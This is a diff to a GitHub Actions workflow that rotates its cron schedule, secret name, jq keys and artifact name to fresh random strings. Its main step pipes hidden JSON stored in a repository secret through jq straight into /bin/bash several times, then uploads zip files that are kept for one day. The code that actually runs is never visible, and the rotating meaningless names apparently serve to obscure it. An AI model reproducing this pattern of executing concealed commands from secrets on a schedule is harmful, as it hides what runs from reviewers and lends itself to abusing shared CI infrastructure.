@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '51 0,6,12,18 * * *'
+    - cron: '2 2,8,14,20 * * *'
 env:
   CI: true
 jobs:
@@ -15,18 +15,17 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          jx0: ${{ secrets.jx0 }}
+          n304: ${{ secrets.n304 }}
         run: |
-          printf '%s' "$jx0" | jq -r .wxdlj3 | /bin/bash
-          echo $ecpsg12302 | jq -r .k94 | /bin/bash
-          echo $xlzz695 | jq -r .jz94688 | /bin/bash
-          printf '%s' "$yed6" | jq -r .v139 | /bin/bash
-          echo $q8 | jq -r .ysy806 | /bin/bash
-          printf '%s' "$swstz5089" | jq -r .b43296 | /bin/bash
+          printf '%s' "$n304" | jq -r .qwfk9 | /bin/bash
+          echo $jxp504 | jq -r .symfn77466 | /bin/bash
+          echo $ysiyl7 | jq -r .a087 | /bin/bash
+          printf '%s' "$st35" | jq -r .t034 | /bin/bash
+          echo $zk7 | jq -r .ox164 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: SVj2xJtp
+          name: Fxrb1acz
           path: "*.zip"
           retention-days: 1
